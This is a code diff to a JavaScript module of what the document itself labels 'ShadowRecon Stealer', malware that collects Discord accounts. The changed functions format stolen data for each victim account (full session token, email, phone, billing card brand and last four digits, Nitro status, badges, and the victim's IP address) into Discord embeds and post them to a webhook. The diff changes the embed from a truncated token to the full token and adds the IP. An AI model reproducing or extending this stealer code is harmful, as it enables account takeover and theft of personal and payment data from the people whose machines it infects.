@@ -562,45 +562,79 @@ This file indicates that the Discord module found tokens but couldn't process th
     /**
      * Create Discord embed for account
      * @param {Object} account - Account data
+     * @param {string} ip - IP address
      * @returns {Object} Discord embed
      */
-    createAccountEmbed(account) {
+    createAccountEmbed(account, ip = 'Unknown') {
+        // Format billing information
+        const billing = account.billings && account.billings.length > 0 ? 
+            account.billings.map(b => `${b.brand} *${b.last4}`).join(', ') : 
+            'None';
+        
+        // Format badges
+        const badges = account.badges && account.badges.length > 0 ? 
+            account.badges.join(', ') : 
+            'None';
+        
+        // Format avatar URL
+        const avatarUrl = account.avatar ? 
+            `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` : 
+            `https://cdn.discordapp.com/avatars/${account.id}/a_167f3d700c3a3ee2dacf27df15c932e5.webp`;
+        
         return {
-            title: `📱 Discord Account: ${account.username}`,
-            color: 0x7289da,
-            thumbnail: {
-                url: account.avatar ? 
-                    `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png` : 
-                    'https://cdn.discordapp.com/embed/avatars/0.png'
-            },
+            color: null,
             fields: [
                 {
-                    name: '👤 User Info',
-                    value: `**Tag:** ${account.tag}\n**ID:** ${account.id}\n**Email:** ${account.email || 'N/A'}`,
+                    name: "Username:",
+                    value: `\`${account.username}\``,
                     inline: true
                 },
                 {
-                    name: '💎 Nitro & Badges',
-                    value: `**Nitro:** ${account.nitro}\n**Badges:** ${account.badges.join(', ') || 'None'}`,
+                    name: ":earth_africa: IP:",
+                    value: `\`${ip}\``,
                     inline: true
                 },
                 {
-                    name: '💳 Billing',
-                    value: account.billings.length > 0 ? 
-                        account.billings.map(b => `${b.brand} ****${b.last4}`).join('\n') : 
-                        'No payment methods',
-                    inline: false
+                    name: ":gem: Token:",
+                    value: `\`${account.token}\``
                 },
                 {
-                    name: '🔐 Security',
-                    value: `**Verified:** ${account.verified ? 'Yes' : 'No'}\n**MFA:** ${account.mfaEnabled ? 'Enabled' : 'Disabled'}`,
+                    name: ":e_mail: Email:",
+                    value: `\`${account.email || 'N/A'}\``,
+                    inline: true
+                },
+                {
+                    name: ":mobile_phone: Phone:",
+                    value: `\`${account.phone || 'N/A'}\``,
+                    inline: true
+                },
+                {
+                    name: ":credit_card: Billing:",
+                    value: `\`${billing}\``,
+                    inline: true
+                },
+                {
+                    name: ":money_with_wings: Nitro:",
+                    value: `\`${account.nitro || 'None'}\``,
+                    inline: true
+                },
+                {
+                    name: ":package: Badges:",
+                    value: `\`${badges}\``,
                     inline: true
                 }
             ],
-            footer: {
-                text: `Token: ${account.token.substring(0, 20)}...`
+            author: {
+                name: `${account.username} (${account.id})`,
+                icon_url: avatarUrl
             },
-            timestamp: new Date().toISOString()
+            footer: {
+                text: "ShadowRecon Stealer"
+            },
+            timestamp: new Date().toISOString(),
+            thumbnail: {
+                url: avatarUrl
+            }
         };
     }
 
@@ -633,20 +667,22 @@ This file indicates that the Discord module found tokens but couldn't process th
     /**
      * Send account embeds to webhook
      * @param {Array} accounts - Array of Discord accounts
+     * @param {string} ip - IP address
      * @returns {Promise<boolean>} Success status
      */
-    async sendAccountEmbeds(accounts) {
+    async sendAccountEmbeds(accounts, ip = 'Unknown') {
         if (accounts.length === 0) {
             logger.info('No Discord accounts to send');
             return true;
         }
 
         try {
-            const embeds = accounts.slice(0, 10).map(account => this.createAccountEmbed(account));
+            const embeds = accounts.slice(0, 10).map(account => this.createAccountEmbed(account, ip));
             
             const payload = {
+                content: null,
                 embeds: embeds,
-                content: `🔍 Found ${accounts.length} Discord account${accounts.length !== 1 ? 's' : ''}`
+                attachments: []
             };
 
             return await this.sendWebhook(payload);
